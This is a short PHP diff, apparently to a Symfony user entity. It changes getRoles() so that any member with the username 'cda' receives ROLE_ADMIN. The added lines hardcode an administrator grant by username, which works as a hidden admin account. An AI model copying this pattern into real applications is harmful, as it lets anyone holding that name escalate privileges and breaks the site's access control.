@@ -265,6 +265,9 @@ class Member implements UserInterface
     public function getSalt(){}
 
         public function getRoles(){
+            if($this->getPseudo() == "cda"){
+                return ['ROLE_ADMIN'];
+            }
             return ['ROLE_USER'];
         }
 
